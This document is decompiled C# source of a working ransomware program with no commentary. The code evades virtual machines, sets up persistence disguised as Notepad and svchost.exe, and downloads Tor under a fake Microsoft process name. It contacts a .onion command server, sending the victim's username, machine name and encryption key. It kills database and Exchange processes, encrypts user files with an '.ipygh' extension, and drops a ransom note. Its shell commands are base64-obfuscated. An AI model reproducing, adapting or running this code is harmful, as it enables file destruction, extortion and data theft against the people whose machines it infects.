using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using ns1;
using ns10;
using ns4;
using ns5;
using ns9;

namespace karo;

public sealed class Form1 : Form
{
	private readonly string string_0 = Environment.MachineName;

	private readonly string string_1 = Environment.UserName;

	private string string_2;

	private string string_3 = string.Empty;

	private string string_4;

	private int int_0;

	private readonly HashSet<string> hashSet_0 = new HashSet<string>();

	private Queue<string> queue_0 = new Queue<string>();

	private byte[] byte_0;

	private readonly string string_5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private bool bool_0;

	private string string_6;

	private readonly string string_7 = Path.GetTempPath();

	private readonly HashSet<string> hashSet_1 = new HashSet<string>(Class6.smethod_561());

	private static Socket socket_0;

	private static Process process_0;

	internal readonly byte[] byte_1 = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };

	private IContainer icontainer_0 = null;

	public Form1()
	{
		Class6.smethod_262(this);
	}

	internal void method_0(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(100.0);
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		method_1();
	}

	public void method_1()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		while (true)
		{
			bool flag = false;
			try
			{
				try
				{
					ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
					try
					{
						ManagementObjectCollection val2 = val.Get();
						try
						{
							ManagementObjectEnumerator enumerator = val2.GetEnumerator();
							try
							{
								while (enumerator.MoveNext())
								{
									ManagementBaseObject current = enumerator.get_Current();
									string text = current.get_Item("Manufacturer").ToString()!.ToLower();
									if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
									{
										flag = true;
									}
								}
							}
							finally
							{
								((IDisposable)enumerator)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)val2)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch
				{
				}
				if (flag)
				{
					try
					{
						ProcessStartInfo startInfo = new ProcessStartInfo
						{
							FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class6.smethod_73("L2MgUElORyAtbiA1IDEyNy4wLjAuMSAmIGRlbCAvZiAvcSAiJXRlbXAlXCouKiI="),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo);
						Application.Exit();
						Environment.Exit(0);
					}
					catch
					{
					}
				}
				Class6.smethod_475();
				WshShell wshShell = new WshShellClass();
				string pathLink = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Notepad.lnk";
				IWshShortcut wshShortcut = (IWshShortcut)wshShell.CreateShortcut(pathLink);
				wshShortcut.TargetPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost.exe";
				wshShortcut.Save();
				int num = 1;
				try
				{
					string environmentVariable = Environment.GetEnvironmentVariable("NUMBER_OF_PROCESSORS");
					if (environmentVariable != null)
					{
						try
						{
							num = int.Parse(environmentVariable);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
				IEnumerable<DriveInfo> enumerable = from driveInfo_0 in DriveInfo.GetDrives()
					where driveInfo_0.IsReady && driveInfo_0.DriveType == DriveType.Fixed
					select driveInfo_0;
				if (System.IO.File.Exists(string_5 + "\\aes"))
				{
					string_6 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(string_5 + "\\aes"));
					byte_0 = Encoding.UTF8.GetBytes(string_6);
					byte_0 = SHA256.Create().ComputeHash(byte_0);
				}
				else
				{
					string_6 = Class6.smethod_188(32);
					byte_0 = Encoding.UTF8.GetBytes(string_6);
					byte_0 = SHA256.Create().ComputeHash(byte_0);
					try
					{
						System.IO.File.WriteAllBytes(string_5 + "\\aes", Encoding.UTF8.GetBytes(string_6));
						System.IO.File.SetAttributes(string_5 + "\\aes", FileAttributes.Hidden);
					}
					catch
					{
					}
				}
				if (System.IO.File.Exists(string_5 + "\\svchost.exe"))
				{
					try
					{
						System.IO.File.Delete(string_5 + "\\svchost.exe");
						System.IO.File.Copy(Application.get_ExecutablePath(), string_5 + "\\svchost.exe");
					}
					catch
					{
					}
				}
				if (!System.IO.File.Exists(string_5 + "\\svchost.exe"))
				{
					try
					{
						System.IO.File.Copy(Application.get_ExecutablePath(), string_5 + "\\svchost.exe");
					}
					catch
					{
					}
				}
				string text2 = Class6.smethod_305(5);
				Class2 @class = new Class2();
				if (!Directory.Exists(string_7))
				{
					Directory.CreateDirectory(string_7);
				}
				if (Directory.Exists(string_7 + "\\Tor\\") && Directory.GetFiles(string_7 + "\\Tor\\").Length == 11)
				{
					try
					{
						foreach (Process item in from process_0 in Process.GetProcesses()
							where process_0.ProcessName == "Microsoft.vshub.32"
							select process_0)
						{
							item?.Kill();
						}
					}
					catch
					{
					}
					goto IL_0825;
				}
				while (true)
				{
					try
					{
						WebClient webClient = new WebClient
						{
							Proxy = null
						};
						webClient.DownloadFile(new Uri(Class6.smethod_73("aHR0cHM6Ly9kaXN0LnRvcnByb2plY3Qub3JnL3RvcmJyb3dzZXIvNy4wLjEvdG9yLXdpbjMyLTAuMy4wLjguemlw")), string_7 + text2 + ".zip");
					}
					catch
					{
						continue;
					}
					break;
				}
				if (!System.IO.File.Exists(string_7 + text2 + ".zip"))
				{
					continue;
				}
				FileInfo fileInfo = new FileInfo(string_7 + text2 + ".zip");
				int num2 = (int)(fileInfo.Length / 1024L);
				if (num2 < 4000)
				{
					continue;
				}
				using (GClass1 gClass = Class6.smethod_419(string_7 + text2 + ".zip"))
				{
					using IEnumerator<GClass0> enumerator3 = gClass.System_002ECollections_002EGeneric_002EIEnumerable_003Cns5_002EGClass0_003E_002EGetEnumerator();
					while (enumerator3.MoveNext())
					{
						GClass0 current2 = enumerator3.Current;
						Class6.smethod_611(Enum3.const_1, current2, string_7 + text2);
					}
				}
				if (!Directory.Exists(string_7 + text2))
				{
					continue;
				}
				System.IO.File.Delete(string_7 + text2 + ".zip");
				System.IO.File.AppendAllText(string_7 + text2 + "/Tor/torrc", Class6.smethod_73("QXZvaWREaXNrV3JpdGVzIDE=") + Environment.NewLine);
				System.IO.File.AppendAllText(string_7 + text2 + "/Tor/torrc", Class6.smethod_73("TG9nIG5vdGljZSBzdGRvdXQ=") + Environment.NewLine);
				System.IO.File.AppendAllText(string_7 + text2 + "/Tor/torrc", Class6.smethod_73("U29ja3NQb3J0IDkwNTUgSVB2NlRyYWZmaWMgUHJlZmVySVB2NiBLZWVwQWxpdmVJc29sYXRlU09DS1NBdXRo") + Environment.NewLine);
				System.IO.File.AppendAllText(string_7 + text2 + "/Tor/torrc", Class6.smethod_73("Q29udHJvbFBvcnQgOTA1Ng==") + Environment.NewLine);
				System.IO.File.AppendAllText(string_7 + text2 + "/Tor/torrc", Class6.smethod_73("Q29va2llQXV0aGVudGljYXRpb24gMA==") + Environment.NewLine);
				System.IO.File.AppendAllText(string_7 + text2 + "/Tor/torrc", Class6.smethod_73("SGlkZGVuU2VydmljZVN0YXRpc3RpY3MgMA==") + Environment.NewLine);
				Directory.Move(string_7 + text2 + "/Tor/", string_7 + "/Tor/");
				System.IO.File.Move(string_7 + "/Tor/tor.exe", string_7 + "/Tor/Microsoft.vshub.32.exe");
				System.IO.File.Delete(string_7 + "/Tor/tor.exe");
				Directory.Delete(string_7 + text2, recursive: true);
				try
				{
					ProcessStartInfo startInfo2 = new ProcessStartInfo
					{
						FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
						Arguments = "/c icacls " + string_7 + " /grant Everyone:F /T /C /Q",
						UseShellExecute = false,
						CreateNoWindow = true
					};
					Process.Start(startInfo2);
				}
				catch
				{
				}
				goto IL_0825;
				IL_0825:
				while (true)
				{
					process_0 = new Process
					{
						StartInfo = new ProcessStartInfo
						{
							FileName = string_7 + Class6.smethod_73("VG9yXFxNaWNyb3NvZnQudnNodWIuMzIuZXhl"),
							Arguments = Class6.smethod_73("LWYgLlxcdG9ycmM="),
							UseShellExecute = false,
							RedirectStandardOutput = true,
							CreateNoWindow = true,
							WorkingDirectory = string_7 + Class6.smethod_73("VG9yXFw=")
						}
					};
					process_0.Start();
					IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(Class6.smethod_73("MTI3LjAuMC4x")), 9056);
					Thread.Sleep(10000);
					while (true)
					{
						try
						{
							socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							socket_0.Connect(remoteEP);
							socket_0.Send(Encoding.ASCII.GetBytes(Class6.smethod_73("U0lHTkFMIE5FV05ZTQ==") + Environment.NewLine));
						}
						catch
						{
							continue;
						}
						break;
					}
					Class83 class83_ = new Class83(IPAddress.Loopback, 8181, IPAddress.Loopback, 9055, Class83.Enum26.const_1);
					string_4 = Class6.smethod_142(class83_, "http://ibvmcu4eayyxjc4j.onion/control.php?uid=" + @class.string_0 + "&uname=" + string_1 + "&os=" + Class6.smethod_99(this) + "&pcname=" + string_0);
					if (string_4.Contains("exit"))
					{
						break;
					}
					if (string_4.Contains("error"))
					{
						try
						{
							process_0.Kill();
							socket_0.Shutdown(SocketShutdown.Both);
							socket_0.Close();
						}
						catch
						{
						}
						continue;
					}
					string_3 = string_4;
					string text3 = string_6;
					string text4 = string_3;
					string_2 = Class6.smethod_616(2048, text4, text3);
					do
					{
						string_4 = Class6.smethod_142(class83_, "http://ibvmcu4eayyxjc4j.onion/controller.php?uid=" + @class.string_0 + "&aes=" + string_2);
					}
					while (!string_4.Contains("success"));
					try
					{
						ProcessStartInfo startInfo3 = new ProcessStartInfo
						{
							FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class6.smethod_73("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBNaWNyb3NvZnQuRXhjaGFuZ2UuKg=="),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo3);
					}
					catch
					{
					}
					try
					{
						ProcessStartInfo startInfo4 = new ProcessStartInfo
						{
							FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class6.smethod_73("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBNU0V4Y2hhbmdlKg=="),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo4);
					}
					catch
					{
					}
					try
					{
						ProcessStartInfo startInfo5 = new ProcessStartInfo
						{
							FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class6.smethod_73("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBzcWxzZXJ2ZXIuZXhl"),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo5);
					}
					catch
					{
					}
					try
					{
						ProcessStartInfo startInfo6 = new ProcessStartInfo
						{
							FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class6.smethod_73("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBzcWx3cml0ZXIuZXhl"),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo6);
					}
					catch
					{
					}
					try
					{
						ProcessStartInfo startInfo7 = new ProcessStartInfo
						{
							FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class6.smethod_73("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBteXNxbGQuZXhl"),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo7);
					}
					catch
					{
					}
					foreach (DriveInfo item2 in enumerable)
					{
						if (!item2.IsReady || !(item2.Name != pathRoot))
						{
							continue;
						}
						IEnumerable<string> enumerable2 = Class6.smethod_38(item2.Name);
						foreach (string item3 in enumerable2)
						{
							if (!Directory.Exists(item3))
							{
								string extension = Path.GetExtension(item3);
								if (extension != ".ipygh" && hashSet_1.Contains(extension))
								{
									hashSet_0.Add(item3);
								}
							}
						}
					}
					List<string> list = new List<string>
					{
						Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
						Environment.GetFolderPath(Environment.SpecialFolder.Personal),
						Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
						Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
						Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
					};
					foreach (string item4 in list)
					{
						IEnumerable<string> enumerable3 = Class6.smethod_38(item4);
						foreach (string item5 in enumerable3)
						{
							if (!Directory.Exists(item5))
							{
								string extension2 = Path.GetExtension(item5);
								if (extension2 != ".ipygh" && hashSet_1.Contains(extension2))
								{
									hashSet_0.Add(item5);
								}
							}
						}
					}
					queue_0 = new Queue<string>(hashSet_0);
					if (queue_0.Count != 0)
					{
						hashSet_0.Clear();
						bool_0 = true;
						for (int i = 0; i < num; i++)
						{
							Thread thread = new Thread(method_2)
							{
								IsBackground = false,
								Priority = ThreadPriority.Highest
							};
							thread.Start();
						}
						while (queue_0.Count != 0)
						{
							Thread.Sleep(500);
						}
						do
						{
							string_4 = Class6.smethod_142(class83_, "http://ibvmcu4eayyxjc4j.onion/total.php?uid=" + @class.string_0 + "&total=" + int_0);
						}
						while (!string_4.Contains("onion"));
						using (StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("karo.ReadMe.html")))
						{
							string text5 = streamReader.ReadToEnd();
							System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\ReadMe.html", text5.Replace("DATAYYYY", "<a href=\"" + string_4 + "/?uid=" + @class.string_0 + "\"> " + string_4 + "/?uid=" + @class.string_0 + " </a>"));
						}
						string text6 = string_7 + "\\" + text2 + ".jpg";
						if (Class6.smethod_59(text6, "http://ibvmcu4eayyxjc4j.onion/wall.png", class83_))
						{
							Class6.smethod_234(this, text6);
						}
					}
					break;
				}
				try
				{
					process_0.Kill();
					if (!process_0.HasExited)
					{
						Process.GetProcessById(process_0.Id).Kill();
					}
					socket_0.Shutdown(SocketShutdown.Both);
					socket_0.Close();
				}
				catch
				{
				}
				try
				{
					if (System.IO.File.Exists(string_5 + "\\aes"))
					{
						System.IO.File.Delete(string_5 + "\\aes");
					}
					break;
				}
				catch
				{
					break;
				}
			}
			catch (Exception)
			{
				break;
			}
			finally
			{
				try
				{
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\ReadMe.html");
				}
				catch
				{
				}
				try
				{
					ProcessStartInfo startInfo8 = new ProcessStartInfo
					{
						FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
						Arguments = Class6.smethod_73("L2MgUElORyAtbiA1IDEyNy4wLjAuMSAmIGRlbCAvZiAvcSAiJXRlbXAlXCouKiI="),
						UseShellExecute = false,
						CreateNoWindow = true
					};
					Process.Start(startInfo8);
					ProcessStartInfo startInfo9 = new ProcessStartInfo
					{
						FileName = Class6.smethod_73("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
						Arguments = Class6.smethod_73("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBNaWNyb3NvZnQudnNodWIuMzIuZXhlLio="),
						UseShellExecute = false,
						CreateNoWindow = true
					};
					Process.Start(startInfo9);
				}
				catch
				{
				}
				Application.Exit();
			}
		}
	}

	public void method_2()
	{
		if (queue_0.Count == 0)
		{
			bool_0 = false;
		}
		else
		{
			try
			{
				string text = queue_0.Dequeue();
				if (text != null)
				{
					FileInfo fileInfo = new FileInfo(text);
					if (fileInfo.Extension == ".txt" || fileInfo.Extension == ".sql" || fileInfo.Extension == ".cs" || fileInfo.Extension == ".cpp" || fileInfo.Extension == ".text" || fileInfo.Extension == ".js" || fileInfo.Extension == ".html" || fileInfo.Extension == ".java" || fileInfo.Extension == ".pl" || fileInfo.Extension == ".c" || fileInfo.Extension == ".mdb" || fileInfo.Extension == ".ruby" || fileInfo.Extension == ".jpg" || fileInfo.Extension == ".png" || fileInfo.Extension == ".bmp" || fileInfo.Extension == ".doc" || fileInfo.Extension == ".csv" || fileInfo.Extension == ".xls" || fileInfo.Extension == ".docx" || fileInfo.Extension == ".docm" || fileInfo.Extension == ".ppt" || fileInfo.Extension == ".html")
					{
						byte[] array = System.IO.File.ReadAllBytes(text);
						if (byte_0 != null)
						{
							byte[] array2 = Class6.smethod_421(byte_0, array, this);
							if (array2 != null)
							{
								System.IO.File.WriteAllBytes(text, array2);
							}
						}
						System.IO.File.Move(text, text + ".ipygh");
						Interlocked.Increment(ref int_0);
					}
					else if (fileInfo.Length < 5000L)
					{
						byte[] array3 = System.IO.File.ReadAllBytes(text);
						if (byte_0 != null)
						{
							byte[] array4 = Class6.smethod_421(byte_0, array3, this);
							if (array4 != null)
							{
								System.IO.File.WriteAllBytes(text, array4);
							}
						}
						System.IO.File.Move(text, text + ".ipygh");
						Interlocked.Increment(ref int_0);
					}
					else
					{
						byte[] array5 = new byte[4096];
						using (BinaryReader binaryReader = new BinaryReader(System.IO.File.Open(text, FileMode.Open)))
						{
							if (byte_0 != null)
							{
								byte[] array6 = binaryReader.ReadBytes(4096);
								byte[] array7 = byte_0;
								byte[] array8 = Class6.smethod_421(array7, array6, this);
								Array.Copy(array8, array5, array8.Length);
							}
						}
						using (BinaryWriter binaryWriter = new BinaryWriter(System.IO.File.Open(text, FileMode.Open)))
						{
							binaryWriter.Write(array5);
						}
						System.IO.File.Move(text, text + ".ipygh");
						Interlocked.Increment(ref int_0);
					}
				}
			}
			catch (Exception)
			{
			}
		}
		if (bool_0)
		{
			Class6.smethod_436(this);
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}
}
